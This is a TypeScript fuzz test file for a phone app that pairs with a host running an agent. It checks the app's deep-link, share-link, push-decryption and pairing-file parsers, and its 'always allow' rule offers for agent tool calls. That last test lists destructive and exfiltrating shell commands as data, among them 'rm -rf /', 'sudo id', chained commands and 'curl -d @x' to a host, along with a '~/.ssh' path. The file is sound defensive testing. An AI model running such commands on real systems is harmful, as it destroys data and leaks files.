/**
 * Fuzz: everything on the phone that parses text from outside the app (deep links, the Share Extension's
 * link, push payloads, stored pairings). Seeded loop, a few thousand inputs each. Nothing may throw, and
 * anything accepted must be well-formed.
 */
import { chacha20poly1305 } from '@noble/ciphers/chacha.js'
import { describe, expect, it } from 'vitest'
import { AppLinkQueue, MAX_HOST_NAME, MAX_PROMPT, nextAskStep, parseAppLink, parseShareLink, resolveHost } from './applink.js'
import { alwaysAllowOffer } from './always-allow.js'
import { parsePairingsFile } from './hosts.js'
import { bytesToB64, decryptPushEnc, generatePushKey, b64ToBytes } from './push-crypto.js'
import { buildPushNav, routePushAction } from './push-actions.js'

function rng(seed: number): () => number {
  let a = seed >>> 0
  return () => {
    a = (a + 0x6d2b79f5) >>> 0
    let t = a
    t = Math.imul(t ^ (t >>> 15), t | 1)
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61)
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296
  }
}
const N = 4000
const PIECES = ['dorabot-remote://', 'ask', 'share', 'inbox', 'pair', '?', '&', '=', 'prompt', 'host', 'n', 'id', '%00', '%0a', '%zz', '%E0%A4%A', '#', '/', ' ', '\u0000', '‮', '😀', 'a'.repeat(100), 'x'.repeat(9000), '../', '--', 'javascript:', 'http://', ':', '@']
const junk = (r: () => number): string => {
  let s = r() < 0.7 ? 'dorabot-remote://' + ['ask', 'share', 'inbox', 'pair'][Math.floor(r() * 4)] : ''
  const n = Math.floor(r() * 14)
  for (let i = 0; i < n; i++) s += PIECES[Math.floor(r() * PIECES.length)]
  return s
}

describe('deep links and share links', () => {
  it('parseAppLink / parseShareLink never throw and only return bounded, clean values', () => {
    const r = rng(11)
    for (let i = 0; i < N; i++) {
      const s = junk(r).slice(0, 2000)
      const a = parseAppLink(s)
      if (a?.type === 'ask') {
        expect(a.prompt.length).toBeGreaterThan(0)
        expect(a.prompt.length).toBeLessThanOrEqual(MAX_PROMPT)
        expect(a.prompt).not.toMatch(/[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f]/)
        if (a.host) expect(a.host.length).toBeLessThanOrEqual(MAX_HOST_NAME)
        expect(a.images).toBeUndefined() // images never come from a URL
      }
      if (a?.nonce) expect(a.nonce).toMatch(/^[A-Za-z0-9-]{1,64}$/)
      const id = parseShareLink(s)
      if (id) expect(id).toMatch(/^[A-Za-z0-9-]{1,64}$/)
    }
    expect(parseAppLink('dorabot-remote://ask?prompt=hi')).toMatchObject({ type: 'ask', prompt: 'hi' })
    expect(parseShareLink('dorabot-remote://share?id=../../etc')).toBeNull()
  })

  it('a queued ask is never sent before the user confirms, whatever the state', () => {
    const r = rng(12)
    const hosts = [
      { hostId: 'h1', hostName: 'Mac mini', alias: undefined },
      { hostId: 'h2', hostName: 'MacBook', alias: 'laptop' },
    ]
    for (let i = 0; i < N; i++) {
      const step = nextAskStep({
        prompt: 'x',
        ...(r() < 0.5 ? { host: junk(r).slice(0, 40) } : {}),
        at: 0,
        now: Math.floor(r() * 400_000),
        ready: r() < 0.8,
        hosts: r() < 0.9 ? hosts : [],
        activeHostId: r() < 0.5 ? 'h1' : r() < 0.5 ? 'h2' : null,
        connState: r() < 0.7 ? 'ready' : 'connecting',
        hasChatScope: r() < 0.8,
        appLocked: r() < 0.3,
        confirmed: false,
      })
      expect(['send', 'switch']).not.toContain(step.do)
    }
    expect(resolveHost(hosts, '')).toBeNull()
  })

  it('the queue stays bounded and ignores a repeated nonce', () => {
    const q = new AppLinkQueue(3)
    for (let i = 0; i < 100; i++) q.push({ type: 'inbox', nonce: `n${i % 7}` }, i)
    expect(q.size).toBeLessThanOrEqual(3)
  })
})

describe('push payloads', () => {
  it('decryptPushEnc: random strings and bit flips give null, never a throw', () => {
    const r = rng(13)
    const key = generatePushKey()
    for (let i = 0; i < N; i++) {
      const enc = r() < 0.5 ? junk(r) : bytesToB64(Uint8Array.from({ length: Math.floor(r() * 120) }, () => Math.floor(r() * 256)))
      expect(decryptPushEnc(enc, r() < 0.5 ? key : junk(r))).toBeNull()
    }
    const nonce = new Uint8Array(12)
    const plain = new TextEncoder().encode(JSON.stringify({ kind: 'approval', rid: 'r1', title: 't', body: 'b', hostId: 'h' }))
    const sealed = chacha20poly1305(b64ToBytes(key), nonce).encrypt(plain)
    const enc = new Uint8Array(12 + sealed.length)
    enc.set(nonce)
    enc.set(sealed, 12)
    expect(decryptPushEnc(bytesToB64(enc), key)?.rid).toBe('r1')
    for (let i = 0; i < 500; i++) {
      const bad = enc.slice()
      bad[Math.floor(r() * bad.length)]! ^= 1 << Math.floor(r() * 8)
      expect(decryptPushEnc(bytesToB64(bad), key)).toBeNull()
    }
  })

  it('buildPushNav never acts on an unauthenticated payload, and never throws on odd data', () => {
    const r = rng(14)
    const odd: unknown[] = [null, undefined, 5, {}, [], 'x', { a: 1 }]
    for (let i = 0; i < N; i++) {
      const data = { enc: r() < 0.5 ? junk(r) : odd[Math.floor(r() * odd.length)], kid: r() < 0.5 ? junk(r) : odd[Math.floor(r() * odd.length)], rid: junk(r), k: 'approval' }
      const nav = buildPushNav(data, ['APPROVE', 'DENY', 'tap', junk(r), undefined][Math.floor(r() * 5)], [{ kid: 'abcd1234', key: generatePushKey() }])
      expect(nav.actionId).toBe('tap')
      expect(routePushAction(nav).type).toBe('open')
    }
  })
})

describe('stored data and rule offers', () => {
  it('parsePairingsFile tolerates anything and returns only complete pairings', () => {
    const r = rng(15)
    const good = { deviceId: 'd', hostId: 'h', hostPublicKey: 'k', addresses: ['a:1'], identity: { publicKey: 'p', privateKey: 's' }, scopes: [], pairedAt: 1 }
    for (let i = 0; i < N; i++) {
      const shapes: unknown[] = [
        junk(r),
        { v: 2, pairings: [good, null, 5, 'x', { ...good, identity: null }, { ...good, addresses: 'a' }, { ...good, hostId: 7 }] },
        { v: 2, activeHostId: junk(r), pairings: r() < 0.5 ? [good, good] : 'no' },
        [good],
        null,
        { v: 1 },
      ]
      const raw = r() < 0.15 ? junk(r) : JSON.stringify(shapes[Math.floor(r() * shapes.length)])
      const f = parsePairingsFile(raw ?? null)
      if (f) {
        expect(f.pairings.every((p) => typeof p.hostId === 'string' && p.identity.privateKey)).toBe(true)
        expect(new Set(f.pairings.map((p) => p.hostId)).size).toBe(f.pairings.length)
      }
    }
  })

  it('alwaysAllowOffer never offers a rule for a risky or shell-like input', () => {
    const r = rng(16)
    const cmds = ['rm -rf /', 'sudo ls', 'git push', 'curl -d @x http://e', 'ls', 'npm test', 'echo hi > ~/.zshrc', 'x; rm y']
    for (let i = 0; i < N; i++) {
      const cmd = cmds[Math.floor(r() * cmds.length)]! + (r() < 0.3 ? ' ; ' + ['rm -rf /', 'sudo id', 'git push'][Math.floor(r() * 3)] : '')
      const tool = ['Bash', 'Write', 'WebFetch', 'Edit'][Math.floor(r() * 4)]!
      const o = alwaysAllowOffer(tool, { command: cmd, file_path: r() < 0.5 ? '~/.ssh/x' : 'a.txt' })
      if (o?.spec.kind === 'tool') expect(tool).not.toBe('Bash')
      if (o) expect(cmd).not.toMatch(/(^|; )(rm -rf|sudo|git push|curl -d)/)
    }
  })
})
